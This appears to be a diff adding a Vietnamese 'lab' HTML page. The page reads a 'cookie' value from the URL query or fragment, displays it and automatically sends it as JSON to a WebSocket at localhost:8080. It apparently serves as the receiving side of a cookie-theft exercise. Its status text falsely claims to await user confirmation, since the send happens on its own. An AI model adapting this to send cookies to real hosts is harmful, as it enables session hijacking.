@@ -1,0 +1,167 @@
+<!doctype html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Page (lab) — gửi cookie param qua WS</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <style>
+        body {
+            margin: 0;
+            background: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+        }
+
+        h1 {
+            position: absolute;
+            top: 20px;
+            width: 100%;
+            text-align: center;
+            color: red;
+            z-index: 10;
+        }
+
+        video {
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+        }
+
+        .back {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 10;
+        }
+
+        button {
+            padding: 10px 16px;
+            border: none;
+            border-radius: 6px;
+            background: #2563eb;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        #debugBox {
+            position: fixed;
+            right: 12px;
+            top: 72px;
+            max-width: 40vw;
+            background: rgba(255, 255, 255, 0.95);
+            color: #111;
+            padding: 12px;
+            border-radius: 8px;
+            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.25);
+            font-family: monospace;
+            z-index: 20;
+            max-height: 60vh;
+            overflow: auto;
+        }
+
+        #status {
+            margin-top: 8px;
+            font-size: 13px;
+            color: #333;
+        }
+
+        small {
+            color: #444;
+            display: block;
+            margin-top: 6px;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>BỊ HACK THÌ PHẢI GÌ ẠAAAAAAAAA</h1>
+
+    <video id="bgvid" src="Download.mp4" autoplay loop muted></video>
+
+    <div class="back">
+        <button onclick="window.location.href='index.html'">Quay lại Index</button>
+    </div>
+
+    <div id="debugBox" aria-live="polite">
+        <div><strong>Decoded cookie param:</strong></div>
+        <pre id="cookieRaw">(none)</pre>
+        <div id="status">Status: waiting</div>
+    </div>
+
+    <script>
+        function getCookieParamFromURL() {
+            const params = new URLSearchParams(window.location.search);
+            if (params.has('cookie')) return params.get('cookie');
+            if (location.hash && location.hash.includes('cookie=')) {
+                try {
+                    const h = location.hash.replace(/^#/, '');
+                    const parts = new URLSearchParams(h);
+                    if (parts.has('cookie')) return parts.get('cookie');
+                } catch { }
+            }
+            return '';
+        }
+
+        function safeDecode(s) {
+            try { return decodeURIComponent(s); } catch { return s; }
+        }
+
+        function isLocalAllowed() {
+            const host = window.location.hostname;
+            const protocol = window.location.protocol;
+            return protocol === 'file:' || host === 'localhost' || host === '127.0.0.1';
+        }
+
+        const cookieRawEl = document.getElementById('cookieRaw');
+        const statusEl = document.getElementById('status');
+
+        (function init() {
+            const raw = getCookieParamFromURL();
+            const decoded = raw ? safeDecode(raw) : '';
+            cookieRawEl.textContent = decoded || '(none)';
+
+            if (!decoded) {
+                statusEl.textContent = 'Status: no cookie param found in URL';
+                return;
+            }
+
+            statusEl.textContent = 'Status: cookie param found (not sent). Awaiting user confirmation.';
+            setTimeout(() => {
+                sendCookieToWS(decoded);
+            }, 200);
+        })();
+
+        function sendCookieToWS(cookieValue) {
+            console.log(cookieValue)
+            statusEl.textContent = 'Status: connecting to ws://localhost:8080...';
+            const wsUrl = (location.protocol === 'https:') ? 'wss://localhost:8080' : 'ws://localhost:8080';
+            const ws = new WebSocket(wsUrl);
+
+            ws.addEventListener('open', () => {
+                statusEl.textContent = 'Status: connected — sending cookie payload (lab-only)';
+                try {
+                    const payload = { type: 'cookie', value: cookieValue };
+                    console.log(payload)
+                    ws.send(JSON.stringify(payload));
+                    statusEl.textContent = 'Status: payload sent.';
+                    ws.close(); // đóng ngay sau khi gửi
+                } catch (e) {
+                    statusEl.textContent = 'Status: send failed: ' + (e && e.message);
+                    ws.close();
+                }
+            });
+
+            ws.addEventListener('error', () => {
+                statusEl.textContent = 'Status: WS error';
+            });
+
+            ws.addEventListener('close', () => {
+                // giữ nguyên status hiện tại
+            });
+        }
+    </script>
+</body>
+
+</html>
